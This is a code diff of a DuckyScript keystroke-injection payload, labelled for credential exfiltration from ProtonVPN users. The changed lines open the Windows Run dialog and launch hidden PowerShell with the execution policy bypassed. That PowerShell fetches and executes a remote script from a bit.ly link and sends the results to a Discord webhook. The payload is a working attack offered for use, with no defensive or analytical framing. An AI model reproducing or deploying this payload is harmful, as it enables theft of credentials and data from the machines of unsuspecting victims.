@@ -27,8 +27,14 @@ REM Category: Credentials, Exfiltration
 REM Requirements: ProtonVPN user logged at least one time and internet connection
 REM 
 
+REM REQUIRED - Provide your url WEBHOOK
+DEFINE WEBHOOK https://discordapp.com/api/webhooks/<webhook_id>/<token>
 
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='<your-wehbook-here>';irm bit.ly/ProtonVPN-config-raw | iex
+DELETE
+STRING powershell -w h -ep bypass $discord='
+STRING WEBHOOK
+STRING ';irm bit.ly/ProtonVPN-config-raw | iex
+ENTER
